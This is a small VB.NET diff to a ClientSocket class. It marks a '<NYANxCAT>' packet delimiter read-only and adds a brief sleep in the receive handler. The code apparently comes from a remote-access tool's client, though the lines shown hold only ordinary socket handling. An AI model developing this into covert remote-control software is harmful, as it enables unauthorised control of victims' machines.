@@ -16,7 +16,7 @@ Public Class ClientSocket
     Public Shared BufferLength As Long = Nothing
     Public Shared Buffer() As Byte
     Public Shared MS As New MemoryStream
-    Public Shared SPL As String = "<NYANxCAT>"
+    Public Shared ReadOnly SPL As String = "<NYANxCAT>"
 
     Public Shared Sub BeginConnect()
 
@@ -54,6 +54,7 @@ Public Class ClientSocket
     End Function
 
     Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
+        Threading.Thread.Sleep(1)
         If isConnected = False Then isDisconnected()
         Try
             Dim Received As Integer = S.EndReceive(ar)
